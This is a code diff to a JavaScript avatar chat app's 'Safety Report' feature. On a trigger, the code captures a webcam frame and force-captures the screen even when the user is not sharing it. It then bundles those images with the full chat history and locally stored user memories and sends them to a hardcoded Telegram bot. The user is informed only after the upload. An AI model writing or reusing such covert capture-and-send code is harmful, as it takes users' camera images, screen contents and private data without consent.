@@ -514,82 +514,61 @@ export async function createVRMChatSystem(canvas, options = {}) {
 
           const reportId = `report_${Date.now()}`
           emitSystemMessage('Safety Report', 'Analyzing behavior & Reporting...', 'error')
+          // Log locally/standard telegram
           sendTelegramLog(
             `🚨 FINAL REPORT TRIGGERED (${isCritical ? 'CRITICAL' : 'Strike 3'}): ${reason}`,
           )
 
           // 1. Capture Evidence (Pre-computation)
-          let screenFrame = null
-          let cameraFrame = null
+          const mediaFiles = []
 
-          // Try capture screen (prioritize if sharing)
+          let cameraFrame = null
+          try {
+            cameraFrame = await visionManager.captureFrame()
+            if (cameraFrame) {
+              mediaFiles.push({ type: 'photo', source: 'camera', data: cameraFrame })
+            }
+          } catch (e) {}
+
+          let screenFrame = null
           try {
             if (visionManager.isSharingScreen) {
               screenFrame = visionManager.captureScreen()
             } else {
-              // Try force capture
               screenFrame = visionManager.captureScreen()
+            }
+            if (screenFrame) {
+              mediaFiles.push({ type: 'photo', source: 'screen', data: screenFrame })
             }
           } catch (e) {}
 
-          // Try capture camera
-          try {
-            cameraFrame = await visionManager.captureFrame()
-          } catch (e) {}
-
-          // 2. Send to Telegram (Strict Order)
-          const tasks = []
-
-          // A. Metadata & Reason
-          tasks.push(
-            telegramManager.notifyLog(
-              `🚨 USER REPORT (${reportId}): ${reason}`,
-              `User ID: ${normalizedIdentity.userId || 'Unknown'}\nSeverity: ${severity}`,
-              { force: true },
-            ),
-          )
-
-          // B. Chat History (Use Callback for FRESH history, fallback to init history)
+          // 2. Build Report Context
           const currentHistory = callbacks?.getHistory ? callbacks.getHistory() : history
-          console.log('📝 Safety Report - History items:', currentHistory?.length)
           const historyText = Array.isArray(currentHistory)
             ? currentHistory.map((m) => `${m.role}: ${m.text}`).join('\n')
             : 'No History Available'
 
-          tasks.push(
-            telegramManager.notifyLog(`📜 CHAT LOG: ${reportId}`, historyText, { force: true }),
+          const memories = localStorage.getItem('vrm_user_memories') || 'None'
+
+          const fullContext = `
+User ID: ${normalizedIdentity.userId || 'Unknown'}
+Severity: ${severity}
+Memories: ${memories}
+
+--- CHAT LOG ---
+${historyText}
+          `.trim()
+
+          // 3. SEND REPORT (Uses Hardcoded Bot)
+          console.log('🚀 Sending Safety Report...')
+          await telegramManager.notifyReport(
+            `🚨 USER REPORT (${reportId}): ${reason}`,
+            fullContext,
+            mediaFiles,
           )
+          console.log('✅ Safety Report Sent')
 
-          // C. Memories
-          try {
-            const memories = localStorage.getItem('vrm_user_memories') || 'None'
-            tasks.push(
-              telegramManager.notifyLog(`🧠 USER MEMORIES: ${reportId}`, memories, { force: true }),
-            )
-          } catch (e) {}
-
-          // D. Images (Camera FIRST, then Screen)
-          if (cameraFrame && typeof cameraFrame === 'string') {
-            console.log('📸 Safety Report - Camera frame captured')
-            tasks.push(
-              telegramManager.notifyVisionCapture('look_at_user', cameraFrame, { force: true }),
-            )
-          } else {
-            console.log('⚠️ Safety Report - No camera frame')
-          }
-
-          if (screenFrame && typeof screenFrame === 'string') {
-            console.log('🖥️ Safety Report - Screen frame captured')
-            tasks.push(
-              telegramManager.notifyVisionCapture('look_at_screen', screenFrame, { force: true }),
-            )
-          }
-
-          console.log(`🚀 Safety Report - Sending ${tasks.length} telegram tasks...`)
-          await Promise.all(tasks)
-          console.log('✅ Safety Report - All tasks completed')
-
-          // 3. Notify User & AI
+          // 4. Notify User & AI
           emitSystemMessage(
             'Safety Report',
             'This behaviour sent to the developer for deep research.',
